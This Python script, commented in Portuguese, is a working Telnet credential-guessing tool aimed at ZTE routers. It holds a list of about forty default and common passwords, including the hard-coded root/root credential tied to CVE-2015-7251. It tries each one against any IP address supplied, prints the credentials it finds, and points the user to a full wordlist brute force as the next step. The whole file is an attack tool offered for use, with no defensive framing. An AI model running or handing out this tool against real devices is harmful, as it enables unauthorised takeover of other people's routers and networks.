#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Script para Testar Senhas Padrão Comuns de Roteadores ZTE
Testa senhas padrão conhecidas antes de fazer bruteforce completo
"""

import sys
from telnet_bruteforce import TelnetBruteforce

# Lista de senhas padrão comuns para roteadores ZTE
DEFAULT_PASSWORDS = [
    # CVE-2015-7251: Credenciais hard-coded em roteadores ZTE ZXHN H108N
    # Username: root, Password: root (vulnerabilidade conhecida)
    "root",
    
    # Senhas mais comuns
    "admin",
    "password",
    "123456",
    "12345678",
    "zte",
    "ZTE",
    "Zte",
    
    # Senhas padrão específicas ZTE
    "admin123",
    "admin1234",
    "zteadmin",
    "zte123",
    "zte1234",
    "zte@zte",
    "Zte@zte",
    
    # Senhas vazias ou simples
    "",
    "1234",
    "12345",
    "123456789",
    "1234567890",
    
    # Combinações comuns
    "admin@zte",
    "root@zte",
    "zte@admin",
    "zte@root",
    
    # Padrões de senha de fábrica
    "factory",
    "default",
    "ztezte",
    "adminadmin",
    
    # Outras senhas comuns
    "pass",
    "Pass",
    "PASS",
    "password123",
    "admin1",
    "root123",
]

def test_default_passwords(host: str, port: int = 23, username: str = "root", 
                          timeout: int = 10, delay: float = 0.3):
    """
    Testa senhas padrão comuns
    
    Args:
        host: Endereço IP ou hostname
        port: Porta do serviço Telnet
        username: Nome de usuário
        timeout: Timeout para conexões
        delay: Delay entre tentativas
        
    Returns:
        Senha encontrada ou None
    """
    print(f"[*] Testando senhas padrão comuns para roteadores ZTE")
    print(f"[*] Alvo: {host}:{port}")
    print(f"[*] Usuário: {username}")
    print(f"[*] Total de senhas padrão: {len(DEFAULT_PASSWORDS)}")
    print("-" * 60)
    
    bruteforcer = TelnetBruteforce(host, port, username, timeout, delay)
    
    for i, password in enumerate(DEFAULT_PASSWORDS, 1):
        password_display = password if password else "(vazia)"
        print(f"[{i}/{len(DEFAULT_PASSWORDS)}] Testando: {password_display}")
        
        success, message = bruteforcer.try_login(password)
        
        if success:
            print(f"\n[+] SENHA PADRÃO ENCONTRADA: {password_display}")
            print(f"[+] Total de tentativas: {i}")
            return password
        else:
            if "falso positivo" in message.lower():
                print(f"    [!] Possível falso positivo detectado")
    
    print("\n" + "-" * 60)
    print("[!] Nenhuma senha padrão funcionou")
    print("[*] Recomenda-se usar o bruteforce completo com wordlist")
    return None


def main():
    """Função principal"""
    if len(sys.argv) < 2:
        print("Uso: python telnet_default_passwords.py <IP> [opções]")
        print("Exemplo: python telnet_default_passwords.py 192.168.1.1")
        print("\nOpções:")
        print("  --username USER    Nome de usuário (padrão: root)")
        print("  --port PORT        Porta (padrão: 23)")
        print("  --delay SECONDS    Delay entre tentativas (padrão: 0.3)")
        sys.exit(1)
    
    host = sys.argv[1]
    
    # Parse de argumentos opcionais
    username = "root"
    port = 23
    delay = 0.3
    
    i = 2
    while i < len(sys.argv):
        if sys.argv[i] == "--username" and i + 1 < len(sys.argv):
            username = sys.argv[i + 1]
            i += 2
        elif sys.argv[i] == "--port" and i + 1 < len(sys.argv):
            port = int(sys.argv[i + 1])
            i += 2
        elif sys.argv[i] == "--delay" and i + 1 < len(sys.argv):
            delay = float(sys.argv[i + 1])
            i += 2
        else:
            i += 1
    
    result = test_default_passwords(host, port, username, delay=delay)
    
    if result:
        print(f"\n[+] Credenciais encontradas:")
        print(f"    Usuário: {username}")
        print(f"    Senha: {result}")
        sys.exit(0)
    else:
        sys.exit(1)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrompido pelo usuário")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Erro: {e}")
        sys.exit(1)


